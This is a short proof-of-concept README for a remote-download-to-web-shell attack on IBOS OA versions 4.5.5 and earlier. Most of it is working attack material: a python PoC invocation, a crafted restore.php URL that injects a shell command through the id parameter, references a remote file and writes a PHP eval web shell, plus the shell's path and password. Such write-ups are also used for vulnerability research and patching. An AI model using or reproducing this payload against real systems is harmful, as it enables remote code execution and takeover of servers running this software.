# IBOS-OA-Remote-Download-Getshell
# Affected Version
## Version <= 4.5.5

## POC
Payload:

```
python2 poc.py -u http://localhost
```

http://localhost/data/restore.php?op=restore&id=https://raw.githubusercontent.com/zhaoweiho/IBOS-remote-download-getshell/master/poxteam.txt%20?%20%26%20echo%20^%3C?php%20@eval($_GET[%22poxteam%22])?^%20>%20weiho.php

Link to Webshell
URL:http://localhost/data/weiho.php
PassWord:poxteam



## References

https://skrskr.me/index.php/posts/open-source-version-of-IBOS-oa-system-getshell.html

